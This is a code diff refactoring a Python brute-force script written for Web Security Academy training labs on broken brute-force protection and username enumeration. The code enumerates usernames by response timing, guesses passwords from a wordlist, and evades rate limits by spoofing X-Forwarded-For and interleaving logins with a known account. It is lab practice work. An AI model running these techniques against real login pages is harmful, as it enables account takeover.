@@ -2,9 +2,9 @@
 import requests
 import random
 import time
-import urllib3
+# import urllib3
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def generate_random_ip():
     """Generate a random IP address to spoof."""
@@ -27,24 +27,24 @@ def get_proxies(proxy_type="burp"):
     return None  # No proxy
 
 
-def get_cookies(session, url, ca_cert_path=False):
+def get_cookies(session, url, ca_cert_path=None):
     """Retrieve cookies automatically from the initial GET request."""
-    verify_setting = ca_cert_path if ca_cert_path else False
-    response = session.get(url, verify=verify_setting)
-    if response.status_code == 200:
+    print(f"Using CA cert path: {ca_cert_path}")
+    try:
+        response = session.get(url, verify=ca_cert_path)
+        response.raise_for_status()  # Raise HTTPError for bad responses (4xx and 5xx)
         print("Initial GET request successful.")
-    else:
-        print(f"GET request failed with status code: {response.status_code}")
-
-    cookies = session.cookies.get_dict()
-    if not cookies:
-        print("No cookies retrieved. Ensure the URL is correct.")
-    else:
+        cookies = session.cookies.get_dict()
         print(f"Retrieved cookies: {cookies}")
-    return cookies
+        return cookies
+    except requests.exceptions.SSLError as e:
+        print(f"SSL Error: {e}")
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+    return None
 
 
-def generate_random_session(username, password):
+def generate_random_session(username, password, url):
     headers = {
         "X-Forwarded-For": generate_random_ip(),
         "User-Agent": random.choice([
@@ -59,7 +59,7 @@ def generate_random_session(username, password):
     return headers, data
     
     
-def find_username_bypass_rate_limit(url, session, cookies, password, ca_cert_path=False):
+def find_username_bypass_rate_limit(url, session, cookies, password, ca_cert_path=None):
     """Enumerate usernames while bypassing rate-limiting."""
     verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provided
     proxies = get_proxies()
@@ -74,7 +74,7 @@ def find_username_bypass_rate_limit(url, session, cookies, password, ca_cert_pat
     failed_usernames = []  # Store usernames for failed requests
 
     for username in usernames:
-        headers, data = generate_random_session(username, password)
+        headers, data = generate_random_session(username, password, url)
         for attempt in range(3):  # Retry up to 3 times
             try:
                 start_time = time.perf_counter()
@@ -138,14 +138,14 @@ def load_password_list():
         return None
     return passwords
 
-def brute_force_password(url, session, cookies, username, ca_cert_path=False):
+def brute_force_password(url, session, cookies, username, ca_cert_path=None):
     """Brute-force the password for a valid username."""
     verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provided
     proxies = get_proxies()
     passwords = load_password_list()
 
     for password in passwords:
-        headers, data = generate_random_session(username, password)
+        headers, data = generate_random_session(username, password, url)
         try:
             response = session.post(
                 url, 
@@ -182,13 +182,13 @@ def brute_force_password(url, session, cookies, username, ca_cert_path=False):
     return None
 
 
-def alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target, ca_cert_path=False):
+def alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target, ca_cert_path=None):
     """
     Alternates between login attempts with your account and brute-forcing the target account.
     """
     verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provideds
     proxies = get_proxies()
-    headers, data = generate_random_session(valid_user, valid_password)
+    headers, data = generate_random_session(valid_user, valid_password, url)
     passwords = load_password_list()
 
     for password in passwords:
@@ -234,50 +234,51 @@ def alternating_brute_force(url, session, cookies, valid_user, valid_password, u
     return None
         
         
-## IMPLEMENTATION ##
-# Target URL and credentials
-url = "https://0aa40021042c9a79807f7139006b0042.web-security-academy.net/login"
+def main():
+    url = "https://0ac100c304cda03481d6ca5f002900a1.web-security-academy.net/login"
 
-# Initialize a session to manage cookies
-session = requests.Session()
+    session = requests.Session()
 
-# ca_cert_path = "certs/burp_cacert.pem" ## Not working
+    ca_cert_path = "certs/burp_cacert_chain.pem"
 
-# Automatically retrieve cookies
-cookies = get_cookies(session, url)
+    cookies = get_cookies(session, url, ca_cert_path)
 
-### LAB: Broken brute-force protection, IP block ###
-# valid_user = "wiener"
-# valid_password = "peter"
-#
-# username_target = "carlos"
-# alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target)
+    ### LAB: Broken brute-force protection, IP block ###
+    # valid_user = "wiener"
+    # valid_password = "peter"
+    #
+    # username_target = "carlos"
+    # alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target)
 
 
-### LAB: Username enumeration via response timing ###
-long_password = "howdy" * 20
-username = find_username_bypass_rate_limit(url, session, cookies, long_password)
+    ### LAB: Username enumeration via response timing ###
+    long_password = "howdy" * 20
+    username = find_username_bypass_rate_limit(url, session, cookies, long_password, ca_cert_path)
 
-if username:
-    print(f"Possible username match --> {username}")
-    while True:
-        try:
-            choice = input("Should I brute force the password? [Y/n] ").strip().lower()
-            if choice == "y":
-                password = brute_force_password(url, session, cookies, username)
-                print(f"Username: {username}")
-                if not password:
-                    print("No password found.")
+    if username:
+        print(f"Possible username match --> {username}")
+        while True:
+            try:
+                choice = input("Should I brute force the password? [Y/n] ").strip().lower()
+                if choice == "y":
+                    password = brute_force_password(url, session, cookies, username, ca_cert_path)
+                    print(f"Username: {username}")
+                    if not password:
+                        print("No password found.")
+                    else:
+                        print(f"Password: {password} \nSuccess!")
+                elif choice == "n":
+                    print("OK. Goodbye.")
                 else:
-                    print(f"Password: {password} \nSuccess!")
-            elif choice == "n":
-                print("OK. Goodbye.")
-            else:
-                print("Invalid input. Please enter 'Y' or 'n'.")
-        except Exception as e:
-            print(f"An error occurred: {e}")   
-        finally:
-            exit(0)
-else:
-    print("Username enumeration unsuccessful.")
-    exit(0)
+                    print("Invalid input. Please enter 'Y' or 'n'.")
+            except Exception as e:
+                print(f"An error occurred: {e}")   
+            finally:
+                exit(0)
+    else:
+        print("Username enumeration unsuccessful.")
+        exit(0)
+        
+        
+if __name__ == "__main__":
+    main()
